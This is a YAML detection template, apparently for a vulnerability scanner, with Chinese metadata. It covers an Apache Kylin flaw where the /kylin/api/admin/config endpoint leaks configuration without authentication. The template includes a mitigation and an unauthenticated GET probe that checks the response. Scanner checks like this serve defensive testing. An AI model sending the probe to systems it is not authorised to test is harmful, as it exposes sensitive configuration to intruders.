app: Apache Kylin
query: body:"Apache Kylin"
meta:
  name: Apache Kylin的未授权配置泄露漏洞
  level: 4
  tags:
    - information_leakage
  description: Apache Kylin 有一个restful api会在没有认可认证的情况下暴露配置信息，攻击者可利用该漏洞获取系统敏感信息。
  homepage: http://kylin.apache.org/cn/download/
  author: 一曲成殇
  references: https://v2.s.tencent.com/research/bsafe/1156.html
  solution: |-
    升级到安全版本，或执行以下缓解措施：
    编辑 "$KYLIN_HOME/WEB-INF/classes/kylinSecurity.xml"；
    删除下列行 "<scr:intercept-url pattern="/api/admin/config" access="permitAll"/>"；
    重启 Kylin实例以使其生效。
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /kylin/api/admin/config
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: config
              type: contains
            - name: code
              value: "200"
              type: equals
  create_at: "2021-11-05 22:26:52"
